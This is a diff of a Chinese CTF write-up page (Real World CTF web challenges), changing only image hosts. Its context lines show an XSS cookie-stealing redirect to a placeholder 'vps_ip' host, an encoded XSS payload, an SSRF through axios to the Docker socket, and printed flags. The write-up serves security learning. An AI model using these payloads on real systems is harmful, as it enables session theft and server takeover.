@@ -108,7 +108,7 @@
 <p>This platform is under protection. DO NOT hack it.</p>
 <h3>Writeup</h3>
 <p>任意方式攻击平台导致403就能拿到Flag</p>
-<p><img alt="" src="https://img.virzz.com/15329659397442.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329659397442.jpg" /></p>
 <p>(忘了截图，偷来的)</p>
 <p><strong>Flag : rwctf{SafeLine_1s_watch1ng_uuu}</strong></p>
 <h2>0x02 dot free (Web)</h2>
@@ -117,11 +117,11 @@
 <p>http://13.57.104.34/</p>
 <h3>Writeup</h3>
 <p>提交url数组导致报错，根据Debug信息，推测为XSS题目</p>
-<p><img alt="" src="https://img.virzz.com/15329662524552.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329662524552.jpg" /></p>
 <p>并暴露部分代码</p>
-<p><img alt="" src="https://img.virzz.com/15329663083412.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329663083412.jpg" /></p>
 <p>尝试XSS后不成功，Fuzz后发生意外，非预期</p>
-<p><img alt="" src="https://img.virzz.com/15329663698969.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329663698969.jpg" /></p>
 <hr />
 <p>右键查看源码可见</p>
 <pre><code class="javascript">function lls(src) {
@@ -178,7 +178,7 @@ location.href = 'http://vps_ip:7799/?cookie='+c;
 </code></pre>
 
 <p><strong>Payload :</strong> <code>http://13.57.104.34/?%7B%22iframe%22:%7B%22value%22:%22%5C%5C%5C%5Cvps_ip_to_dec:7799%22%7D%7D</code></p>
-<p><img alt="" src="https://img.virzz.com/15329684905554.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329684905554.jpg" /></p>
 <p><strong>Flag : rwctf{L00kI5TheFlo9}</strong></p>
 <h2>0x03 BookHub (web)</h2>
 <p>比较有意思，拿出来发单篇</p>
@@ -251,11 +251,11 @@ mounted: function() {
 
 <p>回顾<strong>render.js</strong>，可知，可以通过HTTP参数<code>ctx.query</code>污染后在传递到后端<code>axios(req.body.url)</code></p>
 <p>因此，这个地方存在一个SSRF漏洞，但是<strong>axios</strong>这个东西是不支持<strong>file://</strong>协议的，但是通过文档可知，他支持<strong>UNIX Socket</strong>，并给出一个例子<code>/var/run/docker.sock</code>。</p>
-<p><img alt="" src="https://img.virzz.com/15329752604803.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329752604803.jpg" /></p>
 <p>Ping一波就成功返回<strong>OK</strong></p>
 <p>也就是说可以通过<strong>axios</strong>进行对<strong>Docker</strong>的未授权访问！！！</p>
 <p>通过<strong>Docker Remote API</strong>，我们可以尽情愉快玩耍！！！</p>
-<p><img alt="" src="https://img.virzz.com/15329756056072.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329756056072.jpg" /></p>
 <p><strong>Flag : rwctf{a_journey_from_ssr_to_ssrf_PogChamp}</strong></p>
 <h3>exp.py</h3>
 <pre><code class="python">import requests as req
